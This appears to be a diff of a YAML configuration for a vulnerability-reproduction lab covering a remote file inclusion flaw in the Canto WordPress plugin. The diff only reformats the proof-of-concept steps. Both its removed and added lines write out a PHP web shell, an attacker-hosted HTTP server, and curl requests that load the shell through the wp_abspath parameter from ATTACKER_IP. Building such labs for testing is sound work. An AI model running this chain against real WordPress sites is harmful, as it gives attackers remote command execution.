@@ -114,20 +114,14 @@ poc:
   nuclei:
     - "vt-2023-3452.nuclei.yaml"
   manual:
-    steps:
-      - "1. docker-compose up -d --build"
-      - "2. Complete WordPress setup at http://localhost:8022/"
-      - "3. Activate Canto plugin in wp-admin"
-      - "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090"
-      - "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
+    - "1. docker-compose up -d --build"
+    - "2. Complete WordPress setup at http://localhost:8022/"
+    - "3. Activate Canto plugin in wp-admin"
+    - "4. Start attacker server: mkdir -p /tmp/wp-admin && echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/wp-admin/admin.php && cd /tmp && python3 -m http.server 9090"
+    - "5. Trigger RFI: curl 'http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://HOST_IP:9090&cmd=id'"
   curl_examples:
-    - name: "Check vulnerable endpoint exists"
-      command: |
-        curl -s -o /dev/null -w "%{http_code}" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php
-
-    - name: "Trigger RFI with command execution"
-      command: |
-        curl -s "http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id"
+    - "Check vulnerable endpoint exists: curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php"
+    - "Trigger RFI with command execution: curl -s \"http://localhost:8022/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://ATTACKER_IP:9090&cmd=id\""
 
 providers:
   docker-compose:
